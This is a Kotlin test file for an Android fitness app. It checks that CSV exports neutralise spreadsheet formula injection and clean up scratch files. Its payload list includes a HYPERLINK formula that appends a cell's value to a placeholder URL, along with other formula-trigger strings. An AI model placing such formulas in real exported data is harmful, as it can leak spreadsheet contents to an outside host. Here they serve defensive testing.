package com.forge.app.data.repo

import android.content.Context
import androidx.test.core.app.ApplicationProvider
import com.forge.app.core.time.Clock
import com.forge.app.data.db.ForgeDatabase
import com.forge.app.data.db.inMemoryForgeDb
import com.forge.app.data.db.session
import com.forge.app.data.prefs.SettingsRepository
import com.forge.app.security.BackupEncryption
import com.forge.app.security.FakeDeviceKeyWrapper
import java.io.File
import kotlinx.coroutines.test.runTest
import org.junit.After
import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test
import org.junit.runner.RunWith
import org.robolectric.RobolectricTestRunner

/**
 * CSV exports open in spreadsheets, and their text columns can carry strings the user never typed
 * (imported exercise names, imported day keys). None of them may reach a spreadsheet as a formula,
 * and a finished export must never leave its scratch file behind.
 */
@RunWith(RobolectricTestRunner::class)
class CsvExportSafetyTest {

    private val context: Context = ApplicationProvider.getApplicationContext()
    private val db: ForgeDatabase = inMemoryForgeDb()
    private val clock = Clock { 1_700_000_000_000L }
    private val settings = SettingsRepository(context, clock)
    private val repo = BackupRepository(
        context = context,
        sessionDao = db.sessionDao(),
        loggedExerciseDao = db.loggedExerciseDao(),
        loggedSetDao = db.loggedSetDao(),
        cardioDao = db.cardioDao(),
        coachGoalDao = db.coachGoalDao(),
        settingsRepo = settings,
        photoRepo = ProgressPhotoRepository(context, db.bodyweightDao()),
        avatarRepo = AvatarRepository(context, settings),
        grants = PersistedTreeGrants(context, settings),
        db = db,
        clock = clock,
        encryption = BackupEncryption(context, FakeDeviceKeyWrapper())
    )

    @After
    fun tearDown() = db.close()

    /** The dayKey cell of the single data row. */
    private suspend fun exportedDayKeyFor(dayKey: String): String {
        db.sessionDao().insert(session(dayKey = dayKey))
        val row = repo.exportSessionsCsv().readLines()[1]
        // id is numeric and unquoted; the dayKey cell follows it and may be quoted.
        val rest = row.substringAfter(',')
        return if (rest.startsWith("\"")) {
            val end = Regex("\"(?:[^\"]|\"\")*\"").find(rest)!!.value
            end
        } else rest.substringBefore(',')
    }

    @Test
    fun formulaCellsAreEscapedWithAnApostropheAndQuoted() = runTest {
        for (payload in listOf("=HYPERLINK(\"http://x/?\"&A1,\"Bench\")", "+1+1", "-2+3", "@SUM(1)", "\tcmd")) {
            db.sessionDao().deleteAll()
            val cell = exportedDayKeyFor(payload)
            assertTrue("[$payload] must be quoted, got $cell", cell.startsWith("\"'"))
            val unquoted = cell.removeSurrounding("\"").replace("\"\"", "\"")
            assertEquals("'$payload", unquoted)
        }
    }

    @Test
    fun ordinaryTextIsUntouched() = runTest {
        assertEquals("upper-a", exportedDayKeyFor("upper-a"))
    }

    @Test
    fun noScratchFileSurvivesAnExport() = runTest {
        db.sessionDao().insert(session())
        repo.exportSessionsCsv()
        repo.exportPrsCsv()
        repo.exportWeeklyJson()
        repo.exportFullDataJson()
        val leftovers = File(context.filesDir, "exports").listFiles().orEmpty().filter { it.name.endsWith(".part") }
        assertFalse("scratch left behind: $leftovers", leftovers.isNotEmpty())
    }
}
